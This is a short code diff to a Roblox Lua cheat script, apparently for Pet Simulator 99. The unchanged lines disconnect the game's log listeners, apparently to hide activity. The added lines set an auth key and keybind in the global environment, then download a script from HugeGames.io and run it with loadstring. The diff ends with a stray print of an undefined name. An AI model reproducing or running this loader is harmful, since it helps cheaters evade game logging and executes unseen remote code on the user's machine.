@@ -4,3 +4,10 @@ wait(4)
 for i,v in pairs(getconnections(game.LogService.MessageOut)) do
     v:Disconnect()
 end
+wait(4)
+getgenv().AuthKey = "HUGE_yr9lEktNGFjD"
+getgenv().LoadSettings = {
+    ToggleBind = Enum.KeyCode.RightBracket,
+}
+loadstring(game:HttpGet("https://HugeGames.io/ps99"))()
+print(HIIII)
